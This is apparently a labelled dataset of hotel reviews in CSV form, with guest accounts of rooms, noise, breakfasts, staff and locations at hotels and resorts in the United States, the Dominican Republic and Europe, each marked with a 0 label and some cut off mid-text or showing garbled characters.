"decent. we stayed in the queen suite (2 beds) on the 8th flr. room and bathroom are large, clean, but not immaculate. carpet had soils here and there. balcony had the view of the runway. walls are thin, we used foam earplugs and i could still hear the planes landing. bed was comfortable, but not heavenly. the breakfast had a great selection. eggs/omelettes made to order, bacon, sausage, pancakes, french toast, fresh fruits, cereals, muffins, toast and your usual breakfast drinks. the manager's reception had free alcohol and snacks; popcorn, chips, party mix.the underground covered parking wasn't too bad either. if the lot was full, the attendant will park your car for you. 2nd flr is where the coin laundrymatte is located. only 2 washers/2 dryers. a dollar each. one dryer didn't work too well.the indoor pool is loaded with clorine. the jacuzzi looked really cloudy, yikes! it's also quite noisy on the weekends, there were a lot of teenage kids so it gets pretty loud at night and especially during the breakfast hours. overall, it was an okay hotel. the only saving grace was the free breakfast and drinks; however, in the future, i will probably look for another hotel.",0

"Had a Terrific Time! My family and I spent a week at the Ocean Blue Resort from Sun Apr 1 to Sun Apr 8. Overall, we had a great time. While the weather is something beyond everyone's control, we had seven days of made to order weather - just PERFECT each day.We stayed in Villa 4, room 4102, facing the central courtyard. The room was spacious and clean, but it was very musty upon arrival. Over time, with the A/C turned on, the mustiness cleared up somewhat.While some reviewers had issues with water pressure and temperature, room 4102 had excellent water pressure, even during the peak showertimes of 5 - 7pm. Most of the time the water temperature was sufficiently hot; on one or two days, it was only lukewarm.Villa 4 is located centrally inside the resort - half way between the beach and the lobby. So we didn't really have to walk too far to go anywhere. There is a tram that circles the resort that can be used, but we didn't use it. (My kids did for an evening activity - they and their new friends would hang out on the tram and ride around and around the resort.) The tram is a small truck with a small trailer that has bench seats on it.On the last day of our stay, the resort had no water at all for a fewhours late in the afternoon. We didn't notice it until we tried flushing the toilet - the first flush worked because the water tank was full, but the second one didn't. The shower worked, too. We discovered that the cold water went first, and the hot water disappeared an hour or so later, *after* we were all able to take showers! Luckily for us that day, we decided to shower early.We sampled all the restaurants except for the ones that required additional supplement. We decided that it wasn't worth paying an additional supplement when the other restaurants were generally quitegood. I liked La Casa (Dominican) the best; the meal I had, a beef dish, was outstanding. My kids liked Margarita (the Mexican restaurant) the best, so we ended up going there twice. Route 66 is an attempt to be like Friday's or Applebees (or similar chains), and as long as you don't expect that kind of taste, it was fine. It was a reasonable Spanish facsimile of those types of restaurants. The ribs were quite good there. The Italian restaurant (forgot its name) was so-so. I tried the lamb chops, and they were pretty good, but overall, I liked this restaurant least out of all of the choices. The service was very good in all the restaurants.The coffee at Mike's was outstanding. My wife loved the cappuccino and we always made sure we stopped there in the evening for some. The chocolate chip cookes were very good, too. It'll remind you of Starbucks.We ate at the main buffet for breakfast and the beach buffet for lunch and overall, the food was very good. The staff would come and clear your plate pretty quickly after you finished eating, and if youleft your utensils on the plate, those would be taken away, too. It was sometimes hard to get someone to request another set ot utensils..so if you're like me and like to make multiple trips to the buffet and not fill your plate each time, take the utensils off the plate on your table, and THEN go!If you plan to go to the restaurants for dinner, the early bird catches the prime seating times. Be in line for the restaurants by 6:20pm at the latest (they open at 6:30pm). We lined up for Margaritaat 6:30pm one evening and still didn't get in for the firstseating and had to wait another hour. If you don't want to wait, be sure to have a member of your party line up early...or eat later in the evening where there wasn't much of a wait.Saturday night was Dominican night and the buffet was set up *inside*the kitchen! It was very clean and really very well presented. Therewas a great deal of food choices available, moreso that the other nights, it seemed.The two pools were really nice! One pool had beach chairs with blue padding and the other pool had yellow beach chairs with no padding. The beach had a mixture of both, although there were more yellow chairs. If you want a prime spot at the first pool with the blue chairs, you *must* be an early riser. My wife and I were out the doorby 7:20am every day (to walk on the beach) and EVERY blue chair was taken *every day*. Many of the yellow chairs were taken by that time,too. It seemed the chairs on the beach were available longer before they ended up being taken. One morning, by 7:20, it seemed that nearly EVERY chair in the place was taken. It turned out that people were reserving their chairs the night before! The hotel got wind of that and sent everyone a note letting us know that items left on chairs after 7:30pm would be taken away. The following day, things seemed more normal again.The beach is beautiful. It's very clean, and the white sand never gets hot no matter how hot the day gets. If you like walking on the beach, this one goes on for miles and miles in both directions. You can also see the other hotels this way.The entertainment was okay. We didn't particularly care for the shows we saw, and usually left early. The entertainment staff really worked hard at trying to put on the shows for us and many of them are very talented. But generally we didn't enjoy the shows. Every show started off with some audience participation. One in particular was all audience participation - it had 5 males in the audience come on stage for the Mr. Ocean competition - wacky stunts and the like,including getting dressed up in drag and lip synching to an American singer. This seemed to go on for a very long time, and some of the stunts the volunteers were asked to do really weren't appropriate for the children in the audience.The shows, announcements, sporting activities, etc are done in three languages - Spanish, English and French - to accommo",0

"not good. really spoiled the trip. the main problem with the hotel was not the fact that it was a schlep from the train station, or that the park in front of the hotel was creepy at night, or that the bathroom was a mold adventure park. the main problem was my fellow guests, which were a teen-aged tour group who thought nothing of late night shout-outs, hallway giggle-fests, and general late-night rowdiness that the hotel refused to cabin. the hotel had an all-night frat-party atmosphere and hotel management tolerated it with a wink and a nod. this is a great hotel if you are 14 and away from the folks for the first time. this is a terrible hotel if you are looking for a comfortable room, up",0

"pleasantly surprised as a faithful higher-end chain fan -- marriott, hyatt, westin, etc -- i was wary of the place because the price was so reasonable. it was the reviews on this site that convinced me to take a chance -- and also a little desperation because every hotel in the area was either sold out or $300 a night. is it luxurious? no, but if a marriott courtyard is up to your standards, you'll love this place.first of all, the location is outstanding. about 20 minutes from burbank airport and about 15-20 from hollywood. with a 24-hour ralph's grocery store across the street and the phenomenal jerry's deli -- also 24 hours -- two blocks away, you'll never lack for food or necessities. while the lobby definitely has an old l.a. look to it, and there are some other antiquated touches, like actual keys to the rooms and doorknobs that look as if they missed the recent renovation, there really is nothing to complain about. the rooms are spacious, extremely clean, the bath products are a higher end bath body works and there is sufficiant drawer and closet space. we had a room facing the pool, so it had a small balcony. i was a little worried about noise from early morning swimmers, but never heard a thing. for those who like to exercise while away, the gym is the extremely basic setup of treadmill, bike and all-in-one weight machine in a little room, but it gets you through.finally, everyone we dealt with, from the front desk to the maid who gave me a towel since the gym didn't have any, was extremely nice. a great find. a great price.",0

"great location, ok hotel it would be hard to beat the location of this hotel. it is a few blocks (and a few homeless campsites) from the walk of fame, and easy walking to the hollywood bowl. but, this can be a problem since traffic outside the hotel is horrible. we stayed when there were concerts at the hollywood bowl, so trying to get up the street to turn into the hotel was not easy. then you get the loud throngs of people walking and driving from the bowl in the early morning hours. request a room on the pool side!! parking is limited and expensive, and on busy nights, your car may be buried two or three cars deep, so allow extra time in the morning for the staff to unbury your car. the room was holiday inn average. small, but clean. asked the desk staff for a recommendation for a mexican restaurant nearby, and he sent me to a place that looked like it closed a few years ago. stay here for the location, and just put up with the rest!",0

"fantastic!! we stayed at the best western tuscan inn for a 4 night getaway for our anniversary. we loved the location as it was convenient to everything and a short walk to many attractions. the king room we had was lovely...and large. i was surprised by the size of it, because we've stayed in other hotel rooms in large cities and the rooms were always tiny. the bed was very comfy and the room itself was very clean. we were pleasantly surprised to find a complimentary bottle of champagne on ice when we arrived on our first night (our actual anniversary day). the only problem we had with the room was the noise level coming from the street. we were on the 2nd floor and facing the street and the noise was awful. we were woken up once or twice by really rowdy passersby. the hotel can't control this, but there should be better windows or something to insulate the sound. we've stayed in large cities before and have never had this kind of problem. i'd stay at the tuscan inn again, but i'd request a room facing the courtyard. we missed the wine reception every evening we were there, but we did get coffee and biscotti every morning, which was nice. we had dinner in the restaurant once and it was very good. it got quite crowded as the evening progressed. hotel staff was friendly and helpful...especially concierge. he was one of the better concierge staff i've encountered at a hotel. all in all, a great stay and i'd stay there again in a heartbeat!",0

"Unbeatable Relaxation, Luxury, and Fun! My wife and I just returned to the USA after an 8 day honeymoon at the Paradisis Palma Real. We had a fantastic time and I would recommend this to anyone who is looking to relax in style. The hotel is fantastic, the service is great, the activities are fun, and the ocean view is unbelievable.Here is a quick overview of what to expect as a US tourist heading to the Palma Real.(1) The DR is a Spanish speaking country and the staff at Palma Real is no exception. An English speaking employee is always close at hand, but don't expect everyone to speak English as many of the guests are also Spanish or German speaking and Americans aren't their #1 audience. If you have an open mind and don't mind being patient, you'll have no problem with language.(2) Don't be afraid to ask for assistance when you get there. The staff that checks you in at the front desk won't explain how the resort works. To avoid wandering around aimlessly for your first two days, ask the guest relations attendant to explain the following things to you when you arrive (she'll be seated at a desk to the left of the checkin counter). Find out (a) When and where to eat (b) Where to schedule activities (c) Where to reserve watersport activities (d) What shows are playing and where and (e) How the buffet works.(3) The dinner on the beach costs about $300 extra and needs to be reserved a few days in advance. We didn't do it because of cost, but it did look nice.(4) There doesn't seem to be a big advantage with the Royal Service. They have a private beach with cushioned chairs...but other than that it didn't seem like a big deal.(5) Bring about $200 in $1 dollar bills for tips. As a general rule, you'll tip about $5 to the waiter each night at dinner, about $10 / day to the drink waitresses, $5/day to the bartenders, $2/day to the maid, and $2/order to room service. The tips aren't required, but they're very much appreciated. When you consider that much of the staff lives on about $1,000 a year, a $5 tip goes a long way!(6) Whenever anyone tells you that an offsite excursion is 10 minutes away - assume it is really 40 minutes away. Ten minutes is the universal response and it was never true. :)(7) Don't buy anything at the hotel gift shop. Here's where to purchase your gifts. The town mall is the cheepest. It is a $10 cab ride each way from the resort, but you'll get everything at the best price. The next cheepest is actualy the airport when you're leaving. You'll find the same stuff (keychains, art, etc.) in that gift shop and it will be a fixed price which is very low. The next cheepest are the markets at either end of the beach. You'll have to barter at these shops, and don't be intimi",0

"horrible, horrible, horrible my boyfriend and i stayed in this hotel for one night to enjoy a nice hotel one day while on vacation. when we checked in we were told they could not find our reservation and were left standing in the lobby for almost an hour. we were treated very cold as though it was our fault, and when finally given a room, we had to ask for directions to the room (once again treated like dirt) and no one offered to help with our bags..they were to busy helping the nicer dressed guest. our superior king room was the smallest hotel room i have ever stayed in, and the bathroom was even smaller. we were kept up all night because of the paper thin walls, we could here everyone else staying on our floor. our city veiw (which was extra) was the back side of the hotel's sign. the pool which we were told is open till 10pm really closes at 7pm and becomes a private club that even the hotel guest can't use. when leaving it took the valet 35 mins. to find our car which when then had to walk to even though everyone elses was brought right to the door, and once again were not helped with the bags...the guy didn't even hand us our keys they were left for us in the car!!! we were also charged for things from the minibar that we never touched!!! this was a horrible waste of our money, we were treated much much nicer the next night down the road at a much cheaper hotel.",0

"beware of jack-hammering renovations we booked our stay at the best western tuscan inn fisherman's wharf in san francisco based on it's #1 status on trip advisor and great review in frommer's san francisco 2007 travel guide. we booked directly with the hotel and called to confirm our reservation the night before. we were very pleased with the hotel's location right in the heart of fisherman's wharf/north beach...close to great restaurants (pat's cafe the buena vista), transportation (buses, trolleys, ferries), and the waterfront but what we weren't informed of was the on-going, messy noisy renovations (frommer's listed the property as having completed room renovations in 2005). there was no mention from hotel staff...all that was present was a dumpster out front and a small sign on our floor (2nd) saying sorry for any inconvenience. thankfully we took off early every morning so we really didn't hear the workers until our last day. the jack-hammering in the room next to us started at 8:30am and was still in full swing at noon when we checked out. my husband mentioned to the front desk staff that it would have been appreciated if someone had told us about the renovations when we made our reservation or at check in and was told that the hotel manager set the policy that the staff was to not tell guests. we would recommend this hotel but not until the renovations are fully complete.",0

"Good out-weighed the Bad, But would Not Return Ok - The Resort itself was very well kept, huge and the rooms were fine.The Pool, the beach and the bars were awesome. The pool was huge and had many areas for activities like vollyball or water polo, the swim up bar was fine - but didn't seem to be the happening place, but still served its purpose just fine. The beach was a ton of fun - big waves, clean and soft powder like sand. The bars were all great - pretty much any kind of booze you want and the local beer was actually very good.The trapeze thing was really cool - where else are you going to get to try that???? It was actually a lot harder than it looked. Also - do yourself a favor and stop at your room and change from beach sandals to your sneakers (running shoes.) Two reasons, 1. The thin metal ladder hurts your bare feet going up, and 2. We saw one guy that landed on the net on his feet and his little toe got caught in the netting and snapped..... ouch ! Not a vacation ending injury - but not a pleasant way to spend the rest of your time either.The food..... Ok - the French Restaurant was alright and the Japanese Restaraunt was a little better. Overall, both places were decent.... We did not try the Italian. The Buffet was horrible. There was a ton of selection - but it was all slop. I ate pasta every night..... they couldn't screw that up. Lunches were terrible.....Overall I give the food poor to bad in quality and selection all around. We could have returned to the Japanese or French Restaurants if we wanted to, but you have to wear long pants. When I'm on vaca - especially in hot weather, I wanna lounge in shorts and sandals.... Khaki Shorts with a nice color shirt ??? Why is that not acceptable? None the less - we avoided those places for those reasons.The bar - wait service was fine.

"Good experience at the Westin Waterfront Just returned from a 3 night stay at this hotel. I have to admit, I booked the hotel because I got an excellent rate from The Westin's website ($190/night before taxES) but was nervous after reading some of the reviews here. The hotel really wasn't bad at all. We had no probs with the concierge (called for an extra robe and got 2 within 10 minutes) and check in was fast. Parking will cost you $31/day but you do get access until 6pm the day of your check out. We were on the 4th floor with a bad view but didn't care because we arrived at the hotel an hour early - didn't feel like waiting an hour plus for a room on a higher floor. Would have been able to get one if willing to wait. Yes we could hear water running from a neighboring shower (once) and heard some doors slam, but you can't expect complete silence - at least I don't - when in a hotel. My only complaint/disappointment was that I felt like our room was cleaned on the fly - like towels looked like they were quickly folded and thrown on the rack. I just expected a bit more care from a Westin. But other than that, great, comfy bed and awesome shower. Room was pretty up",0

"nice, clean, friendly hotel stayed here one night with my son on dec 27. we picked this hotel only because of it's proximity to lax because he loves flying and watching aircraft land and take off. in fact, we specifically requested a room with a view of the air traffic. the receptionist was very friendly and put us in room on the 10th floor facing north. the room was decorated in a modern style and very clean. it was not very big, but certainly not small. the beds were soft and the bath room was nice with plenty of towels. the workout area has about 10 cardiovascular machines, each with it's own tv screen. the bar is comfortable. the pool was about 80 degrees and comfortable. we moved to a different room after i walked around and found that the view to the south (which has more traffic noise...but not enough to disturb you) had a better view of the airport. the receptionist was very friendly and helpful in finding a room with a southern view. overall, i'd stay again (especially via the priceline price i got.) parking is a bit steep at $13.50 overnight.",0
excellent location two night stay at stratford exceded our expectations. the location is absolutely perfect. we took the bart from the airport and hotel was less than five minute walk. we arrived early and were greeted by a very friendly and accomodating staff. our bags were stowed until check in time and we headed out. bus and muni are also only a few minute walk away and the trolley runs directly in front of the hotel. had lunch and returned to hotel. rooms are very small but comfortable and clean. similar to accomodations throughout europe. walls however are a bit thin and can hear walking over head. we are not light sleepers so this was no problem for us. would definitely stay at this hotel again. cannot beat the price and location for downtown san francisco.,0
"nice hotel with minor problems. this is an older resort that has been remodeled. we requested an upgrade at check-ion and were upgraded to a two bedroom two bath suite with a microwave and mini-fridge. no utinsels or kitchen itmes were provided. the unit was clean, but the ligithing was horrible. even after having a few bulbs replaced it was still very dark. there were some minor problems and you could tell the place was older. but, the beds were very comfortable and the grounds have mature trees and lovely landscaping and the lobby was huge and beautiful. we arrived shortly after a wind storm and the pool was full of leaves. we were there for two nights and the pool was not cleaned properly during that time. piles of leaves were left along the pool. side instead of being cleared away. the pool was very nice, but it would have been more enjoyable if it had been maintained better. the breakfast buffet was very good with made to order omelettes and pancakes/french toast, fruit, muffins, breakfast meats, etc. the evening social hour was also nice with finger foods and alcoholic and non-acoholic drinks. the staff was very friendly, helpful, and accommodating. they recommended a bbq place called bobby-q's. it was the best food we had during our two-week trip. if you get the chance make sure you eat there. we ate there twice and loved it. reasonable prices and excellent food. we would definitely stay here again, but we would request a room with better lighting and one on the first floor.",0

"pleasant stay at the stanford court we arrived in san francisco thursday morning and took bart to the powell station. we decided to bag the cab and just walk up powell to the stanford court hotel - with our luggage. (yes, i know ité¥??? at the top of nob hillé¥?but i knew weé¥?? be eating a lot of delicious food and welcomed the exercise)we booked our room about 2 months before our stay on marriotté¥??? web-site. they had a deal é¥?super savvy weekend rate for $159.00 and we stayed 4 nights. the stanford court is a nice, clean hotel with a very friendly staff. we arrived around 10:30am and to my surprise, the room was ready. ié¥?? platinum with marriott so we selected our arrival gift: bottled wateré¥?quite parched after the uphill trek) and brie/crackers é¥?plus it came with a side of grapes é¥?yum.the size of the room is a bit bigger than most san francisco hotels (but many sf hotels have tiny rooms). the room was clean but very traditional, almost antique looking furniture but the room had everything we needed. a king bed with down comforters and pillow top, separate vanity from the bathroom with full length mirror, open closet next to the vanity/sink with bench. our room was on the 8th floor with a partial city view. i noticed the walls in the room needed a fresh coat of paint but i could smell fresh paint in the hall-way and noticed theyé¥?? painted other areas around the hotel, so ié¥?? sure room will be refreshed soon.the bed seemed very comfortable at first but at night as we slept the bed sloped a bit in the middle. weé¥?? wake up right next to each other and weé¥?? have to scoot back to our sides. it may have been the mattress or maybe an old bed frame?we loved the chocolates on our pillows with the turn down service and hot chocolate with our wake-up call. as a platinum member, we got the healthy start buffet on weekday mornings in the restaurant. they had oatmeal, granola, cereal, croissants, pastries, fresh berries, toast, etc. it was good.the location is perfect é¥?walk down powell to union square or walk down california to china town and the embarcadero or walk down powell to the north to north beach and fishermané¥??? wharf. sometimes the walk back up the uphill was a little difficult after a big meal but we loved the exercise. if weé¥?? had enough exercise for the day, it was easy to catch a cab for a few bucks. the trolley stops at the top of the hill é¥?but ité¥??? not worth $5 a person. a cab is much cheaper.just down powell, a street or two is a liquor store/market. the prices are better than other similar stores closer to union square. ité¥??? a great place to stock up on water, snacks and beverages for the week. just down from the market is a great little mexican restaurant. i doné¥?? remember the name but it was really good an in-expensive compared to other nearby restaurants. other days/nights we ventured to north beach for lunches and dinner. north beach has better restaurants than union square. we always felt safe walking back to the hotel at night.the staff was pleasant and we did not have any problems. i would stay at this hotel again.",0

"a splendid place for a 1 or 2 night stay! we needed a hotel near the airport because we reserved a rental car for tomorrow. my kids are 12 and 10, and i didn't want to make them go on a big drive when to us, it felt like 11:00. we took the bus to the hotel, which went very smoothly. the staff was very caring and kind.the beds were comfortable, but we requested foam pillows, and when we called the lobby, they were out. otherwise, the room was very clean and very nice.the outdoor pool and jacuzzi was really, really fun. the pool was warm(!!!), and the jacuzzi wasn't extremely hot, it felt like my shower temperature. the scenery was pretty outside, where there were exotic trees that were worth pictures.overall, everything except pillow stock was tremendous!",0

"utterly disappointed, unimaginable customer service my wife and i went to madrid for a 4-day vacation last week and had booked hotel plaza mayor over the internet after reading the reviews here and a couple of other sites. we had given our credit card details and everything over email. the hotel room was great infact. it was a corner room with three windows facing three different streets. of course, we were hardly in the room to enjoy the view since we left early and returned late.the problem was that on the third day while we were away, they checked us out. we went out in the morning after having breakfast in the hotel and handing over the keys to the front desk. when we came back at 8pm in the night, the front desk tells us that we were checked out since we hadn't given the checkout",0

"just fine. this hotel is located in pioneer square, though just a quick walk to the water front/pike's market. however, the immediate location is a bit rough around the edges and there is a very apparent homeless population. once you've walked several blocks away towards the market, it gets noticeably better. the hotel is very nice -- our room was spacious and nicely decorated. there was a very toxic cleaning agent odor that required us to open the windows and leave them open. otherwise, it was a nice big room with a good sized bathroom. breakfast was great. it is served in an adjoining breakfast room/cafe to the hotel and includes cereal, pastries, bagels and then some. above and beyond most continental included breakfasts. the parking is about 1 1/2 blocks away and costs $18 a day. it's relatively convenient, though when we returned back to the lot around 9 or 10 pm after attending a wedding, it was sketchy. there were a few shady characters lingering around the garage (it's locked and requires access, but once your key card opens the door, anyone can cruise in after you.) all in all, it's a convenient decent place for a reasonable price. if you're looking for luxury, this isn't it, but it's more than adequate.",0

"excellent food,problems with room temp i stayed at montura renaissance for a professional meeting during a week-end (april 12-16, 2007). all ran really smooth, having a super cordial check-in process from a guy just transfered from a marriott hotel in ny. hotel room big enough for 1 guest, really comfortable bed...but, problems with the room temp adjustment, made me call front desk for a table heater, since it was pretty cold in , as it was out, since i came from puerto rico not too used to those temps. the hair dryer in the bathroom was not working, but i did not reported anyway. another thing was that i had found in other web sites better deals for the same nights, having us a special corporate rate, it was not really a special rate, it appears as the regular offered rates for these sites. well i got 2 free nights -of 4- using my marriott rewards points, so it was not that bad..... food in the hotel and during meetings was excellent, international menus done really great , and the breakfast buffet excelent also, waiters super cordial people and 'bilingual', a lot of them speak spanish. bad that room serv after midnight was limited to certain menu -soups salads-. overall will stay again if i have too, but far from everything, just 5 min from lax...............",0

"roadside redeye i booked this hotel because it is close to the airport and it was to be a nice place to rest for an overnight stay. was i wrong! the dominant feature of this facility was the inescapable noise from the highway. the hotel is directly under the overpass of the major highway and the traffic never stops. it appears to be a once-nice accommodation, with a pool and a restaurant. the restaurant closes early in the evening, leaving the later arrivals to wander a questionable neighborhood in search of food. the breakfast there is good. the staff is friendly. the beds are adequate. carpets are stained and dirty. cleanliness of rooms is below average. there is a shuttle service to and from the airport. the service to the airport is fine. not so the arrival: we sat for at least half an hour awaiting the shuttle from the airport, watching other shuttles from area hotels come and go. that was another unwelcome frustration. if you are looking for a restful night, this is not the place for you. i will never return. the inconvenience of traveling further from the airport to rest my weary body is minor when compared to the overwhelming discomfort of the roadside redeye experienced at this hotel. don't go there!",0

not the hotel for you? the hotel is well located close to the shopping and restaurant area which was across the road. the check in was efficient and the small pool area was good to keep cool. the room and bathroom were clean and were of a good standard for the class of hotel.however i cannot recommend this hotel as it has very thin walls and this means that a good nighté¥??? sleep is impossible due to the amount of noise. we were continually awakened by noise from through the walls and also from above and below. if a good nights sleep is important é¥?well this is not the hotel for you.,0

"good hotel for your $$$ i stayed here for 7 days and was pleasantly surprised, especially after reading some of the more negative reviews posted here. i did not have any of their experiences (i.e. cobwebs, etc.). my room had a kitchenette with stove, refrigerator, iron/board. also had a queen size bed. price was $135/night (not including all the taxes). my room was clean and housekeeping did a great job daily. my room also had wifi access which was wonderful and i used daily. i did notice however, that in certain parts of the room the signal was stronger than others. it seemed to be strongest when i sat at the desk. very good continental breakfast. 1 block from the t (boston subway), which was convenient and i took all over the city. i just graduated from boston univ. and took the t there. also close to boston college. staff overall were friendly and helpful although one guy kind of had an attitude. thus, i give it a rating of 4/5. i would stay here again and also recommend this hotel to others. it's a best western; not a hilton. good value, i think.",0

"old world pleasure located in down town los angeles, i found the pricing to be similar to that of much lesser hotels in west hollywood so value for money was amazing!!! their standard rooms are massive, clean and quietly elegant! the lobby and all common areas remind one of what you might imagine a grande hotel in the old european fashion to be (though really europe rarely offers such space and elegance at this price!!the staff were friendly and helpful and my overall experience makes me want to return again and again anytime i'm passing through la!the only draw back is down town la it's self. outside the hotel most restaurants and activities are non existent after 6pm and down town is rather far away from many of the cities tourist venues. still, the millenium biltmore for me was a treat in herself!",0

"Charming; Excellent Hospitality My husband and I spent a week here while on our honeymoon. It was our first visit to Italy for the both of us and we had a wonderful time. We enjoyed the location of Residence Michelangiolo because it is outside the city center so it's not super crowded; but at the same time it is within walking distance (approx. 20 minutes). Angela and her husband were very welcoming and were happy to answer all of our questions (which were a lot) since this was our first time to Florence. They had great suggestions as far as where to go, what to see, and were willing to help with directions, booking tickets, etc.We were very pleased with the size of our room and the adjoining bathroom, which was very modern and up to ",0

"memorable trip we stayed there for christmas and had one of the most memerable times. the staff was extremely delightful and welcoming, because we have so many kids (5), they gave us a presidential suite free when my wife asked for an upgrade. the water rides were all open and warm. we asked for fun spots and one person recommended rawhide. it is a western town decorated for the holidays, and it is well worth the drive. we view our family video of our vacation often and plan on returning for future trips.",0

"approach with caution my wife and i stayed there on the night before a flight to the midwest and then upon return. we used the stay and fly package for one week parking. upon return from our week away our car was damaged by someone evidently backing into it. the spaces are very small and distance between rows is adequate for careful drivers, but evidently not the one who hit us and then failed to notify. i went to the desk and advised raj who was working the desk. he said he would write a report and have it ready to send to the company in the morning. there was another person on the desk in the a.m. and he said he didn't know of any report being written.i would advise against leaving a vehicle there if you want it in the same condition you left it in. the rooms are ok but the clientele is a little dicey. i would say the rooms were clean but the building is clearly showing its age. the desk is not unfriendly, but all the gentlemen that i met did not have a particular good fluency in english.i would certainly check out other hotels near the airport before staying there again.",0

"good, not great what a disappointment that this beautiful hotel is in such a poor part of the city. we were told not to walk outside after dark, that it wasn't safe. heck i felt uneasy in the daylight. i think the biggest part of this hotel were the people behind the counter at the desk. they were all very young, and obviously in need of some serious customer service training. one evening i asked at the check in desk for some postcards stamps and when i was told they had none, but had regular stamps i said that would be fine. the kid went in the back (was gone quite a long time) and when he came out said we're out of postcard stamps i said, then i'll take the regular stamps. at this point a girl standing near him jumped in and said you don't understand, we don't have any postcard stamps. i said no you don't understand, i have asked for some postage and obviously you don't wish to sell me any. never mind, it's not supposed to be this hard.i went to the gift shop at the other end of the lobby (in the same hotel) and asked if they had any stamps and was told that they didn't, but that the ups store in the next space in the lobby did. sheesh!i never did figure out what the deal was with the cafe on the second floor, but it was never open while i was there. once evening on my way back to my room i asked at the desk if it was open and one girl behind the counter said yes and at the same exact time another said no. i just shook my head and kept on walking.",0

"great location, but had a few issues our family of 4 just returned from a four night stay at this manhattan hotel. having read many of the reviews on this site, we decided that it would be a great accommodation choice. while most of what we read proved to be true, we encountered a few problems over the course of our stay. this hotel definitely has both pros and cons. pros:-location is excellent. you can easily walk to many destinations including 5th ave. shopping, rockefeller center, times square, theaters, and countless restaurants.-rooms are exceptionally large, especially when compared to an average new york hotel room. our room had high ceilings, original hard wood floors, kitchen, etc.-relatively quiet at night. we generally could not hear the noisy streets.-reasonable price.cons:-could be cleaner. overall our room was very dusty. the counter top and the fridge handle were sticky. having read how clean this hotel is, we were not impressed with the state of our room.-extremely small elevator. we could barely fit all 4 of us in with our luggage. the lobby was also tiny.-confusion regarding the reception desk staff and our room safe. the safe required a master key to activate. we were given the wrong master key 3 times. each time we called down to inquire as to why the key didn't work, we were instructed to go down to the lobby to be given another key. the key that eventually worked was labeled for room 4d, although we were in a completely different room and on an entirely different floor.-the first morning of our stay, we went to pull our kitchen table away from the wall so we could all sit down and have breakfast. as soon as we lifted the table, one of the legs completely fell off onto the floor. we were left holding up a 3 legged table while trying to reattach the broken leg. -the sofa bed was one of the most uncomfortable we have ever encountered. the pillows were small and unusually lumpy. in conclusion, the location and size of the rooms outweighed most of these issues. for the amount of time we spent at the hotel, this accommodation was adequate. we would recommend the affinia 50 hotel as an alternate choice, as we stayed there on our last trip and had no complaints. we constantly found ourselves comparing the best western and the affinia 50, and as a result were somewhat disappointed.",0

"$40 per day for parking!! this hotel had a really nice look to the lobby and other various rooms, although the guest rooms are very dusty and old fashioned and i dont mean the style i just mean they need modernising......alot! the tv looked like the oldest model iv ever seen in a hotel and the hotel itself believes its a luxury one!!! iv never seen such old electrical appliances. staff were friendly and it has a nice historical feel, i think thats why it gets away with being a so called luxury hotel. its very expensive, no mini bar in the room, bathroom was tiny! i had stayed in palm springs for 3 nights before arriving here and payed $100 per night for a 5 star real luxuruy hotel and there is such a big difference in the quality of the hotels. parking is $40 per day which is nearly more than a room itself!!! the location is good if you want to be down town la but its far from hollywood and santa monica. if id known then what i know now there is no way id stay there and its due to overpriced parking and interenet and last but not least the location. i would much rather be on the beach or a more relaxed area.",0

"Great Location This hotel is located in a very central area for the attractions in Boston. It's an easy walk to the beginning of the Freedom Trail and has some beautiful streets close by with plenty of cafe's and shopping. The hotel itself is nothing fancy, small beds, no great views from the windows - but it's very clean and has modern looking rooms. The price was good in comparison to other Boston hotels in the area and the staff was polite and helpful.

"like coming home only better... we just returned from spending the past week at the royal palms and there simply aren't enough good things to be said about our visit.from the moment we arrived, we were greeted by an amazingly friendly, warm and caring staff who went out of their way to make us feel welcome. our first contact was with tony, one of the valet attendants, who opened our doors, introduced himself and thereafter, always knew us by name. (this was a trait of everyone we met on the property...it was as if we were staying with friends who always greeted us this way.) he took care of our luggage while we checked in and then gave us a tour of the property and then showed us to our room.we splurged on a deluxe casita and it was well worth it. the room was beautiful, but then again, what isn't beautiful at the royal palms? the only other place we have seen that was so completely visually appealing was a resort we stayed at in tahiti. obviously very different environments but beauty is beauty no matter where it's found. the entire property makes you feel like you are living in a lovely, watercolor painting. the colors of the buildings and flowers and artwork all make for a serene and soothing atmosphere which you find yourself melting into very quickly.the casita was beautifully decorated and very roomy. we had a private patio in the back with a view of camelback mountain. we had our own patio in the front as well (there are curtains you can let down to increase the feeling of privacy) where we sat and enjoyed the lovely evenings. the bathroom is a slice of heaven. the huge, walk-in shower with built-in, tiled seating is a spa treatment in itself. and the selection of soaps and lotions that are provided are wonderfully luxurious.we can't offer enough praise to everyone, and we mean literally everyone, who works there. everyone is so happy and i don't mean in a freakish disney/stepford way. it's as if everyone there is absolutely thrilled to be doing their jobs and in finding ways to make you feel content and welcome. we never heard a raised voice, saw a scowling face or felt as if we weren't the most important guests there.the food in the restaurants is wonderful if just a little pricey but then again, you're paying for unsurpassed quality and service. t. cook's serves marvelous meals and the cabana grill has wonderfully casual lunches (and breakfast brunch on sundays) and poolside drinks. the poolside service is unsurpassed and again, rick and jose (i can't say enough good things about the two of you either!!!) make you feel as if you're visiting their home. and by the joy they demonstrate when doing their jobs, it's no wonder you feel that way.we didn't use the spa but we visited the boutique area and it was beautiful as well and also well stocked with a wide assortment of spa products.on our last night there, we had the privilege of attending the general manager's reception in the presidential villa (where president bush had stayed just 2 weeks prior...regardless of your politics, it's pretty cool to know you're standing in the bedroom where a world leader has recently slept!). our wonderful friend jose was there and we also had the joy of meeting greg miller, the gm, rick behr, delores (i hope i spelled your name correctly!) the director of experiences, and gregory casale, the head chef. they were all entertaining and charming and we had lovely drinks and hors d'oeuvres which made for a great send-off on our last night. we were truly sad to leave them, in fact when we left to go back to our casita, jose made a point of stopping us and letting us know what a pleasure it had been to have us stay with them. it felt so much like saying good-bye to a friend that we hugged him before we left.my husband had seen the resort on great hotels on the travel channel but could not remember the exact name of the resort. since we had never been to phoenix before, that meant we had to search through every other high-end resort property before he recognized the royal palms from its pictures. even after having looked at all those other properties, we just had a feeling about the royal palms and we couldn't have been happier to have made the choice we did. there will be no other place for us to stay on any future visits to phoenix. why would we? coming back to the royal palms would be like coming home.and as a testament to the commitment to service and care the royal palms offers, look at the negative reviews of any of the other comparable resorts. do you see any responses from those properties' management? no. and in the scant negative comments i've seen about the royal palms (both of which seemed to come from completely unreasonable people in my opinion), they took the time to respond and see if they could make things right. that says it all to me.this is the finest property in phoenix, hands down. i don't need to stay anywhere else to know that. thank you to everyone at the royal palms who made our stay with you an absolute 